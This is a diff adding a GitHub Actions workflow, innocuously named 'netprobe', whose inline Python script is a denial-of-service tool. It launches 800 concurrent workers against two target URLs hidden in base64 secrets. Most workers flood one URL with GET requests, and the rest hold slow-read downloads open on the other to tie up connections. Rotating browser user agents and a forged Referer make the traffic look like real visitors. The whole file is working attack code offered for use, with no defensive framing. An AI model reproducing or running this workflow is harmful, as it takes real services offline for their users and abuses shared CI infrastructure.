@@ -1,0 +1,130 @@
+name: netprobe
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        env:
+          NET_A: ${{ secrets.NET_A }}
+          NET_B: ${{ secrets.NET_B }}
+          WORKERS: "800"
+          MIX: "0.8"
+          SECONDS: "240"
+          GAP: "0.5"
+          HOLD: "30"
+        run: |
+          python3 -m pip install --quiet aiohttp 2>/dev/null || pip install --quiet aiohttp
+          python3 - <<'PY'
+          import asyncio, aiohttp, base64, os, random, time
+          from urllib.parse import urlparse
+
+          A = base64.b64decode(os.environ["NET_A"]).decode().strip()
+          B = base64.b64decode(os.environ["NET_B"]).decode().strip()
+          o = urlparse(A)
+          REF = o.scheme + "://" + o.netloc + "/"
+
+          WORKERS = int(os.environ.get("WORKERS", "800"))
+          MIX = float(os.environ.get("MIX", "0.8"))
+          SECONDS = int(os.environ.get("SECONDS", "240"))
+          GAP = float(os.environ.get("GAP", "0.5"))
+          HOLD = float(os.environ.get("HOLD", "30"))
+
+          UAS = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+          ]
+
+          def h1():
+              return {
+                  "User-Agent": random.choice(UAS),
+                  "Accept": "application/json, text/plain, */*",
+                  "Accept-Language": "zh-CN,zh;q=0.9",
+                  "Cache-Control": "no-cache",
+                  "Referer": REF,
+              }
+
+          def h2():
+              return {
+                  "User-Agent": random.choice(UAS),
+                  "Accept": "application/octet-stream,*/*",
+                  "Accept-Language": "zh-CN,zh;q=0.9",
+                  "Cache-Control": "no-cache",
+                  "Referer": REF,
+              }
+
+          deadline = time.time() + SECONDS
+          TO1 = aiohttp.ClientTimeout(total=30, sock_read=30)
+          TO2 = aiohttp.ClientTimeout(total=60)
+          hits = {"a": 0, "b": 0, "e": 0}
+
+          async def fast(s):
+              while time.time() < deadline:
+                  try:
+                      async with s.get(A, headers=h1(), timeout=TO1, allow_redirects=False) as r:
+                          await r.read()
+                      hits["a"] += 1
+                  except Exception:
+                      hits["e"] += 1
+
+          async def slow(s):
+              while time.time() < deadline:
+                  hold = HOLD * (0.6 + random.random() * 0.8)
+                  t0 = time.time()
+                  try:
+                      async with s.get(B, headers=h2(), timeout=TO2, allow_redirects=False) as r:
+                          if r.status == 200:
+                              hits["b"] += 1
+                          else:
+                              hits["e"] += 1
+                          while time.time() - t0 < hold:
+                              try:
+                                  chunk = await r.content.read(16384)
+                              except Exception:
+                                  break
+                              if not chunk:
+                                  break
+                              await asyncio.sleep(GAP)
+                          if time.time() - t0 < 2:
+                              await asyncio.sleep(1)
+                  except Exception:
+                      hits["e"] += 1
+
+          async def ping():
+              while time.time() < deadline:
+                  t0 = time.time()
+                  try:
+                      async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as s:
+                          async with s.get(A, headers=h1()) as r:
+                              await r.read()
+                  except Exception:
+                      pass
+                  print(f"P ms={int((time.time() - t0) * 1000)} at {time.strftime('%H:%M:%S')}", flush=True)
+                  await asyncio.sleep(20)
+
+          async def report():
+              while time.time() < deadline:
+                  print(f"C a={hits['a']} b={hits['b']} e={hits['e']} at {time.strftime('%H:%M:%S')}", flush=True)
+                  await asyncio.sleep(20)
+
+          async def main():
+              nf = int(WORKERS * MIX)
+              ns = WORKERS - nf
+              conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=30, keepalive_timeout=0)
+              async with aiohttp.ClientSession(connector=conn) as s:
+                  await asyncio.gather(
+                      *[fast(s) for _ in range(nf)],
+                      *[slow(s) for _ in range(ns)],
+                      ping(),
+                      report(),
+                  )
+              print(f"C FINAL a={hits['a']} b={hits['b']} e={hits['e']}", flush=True)
+
+          asyncio.run(main())
+          PY
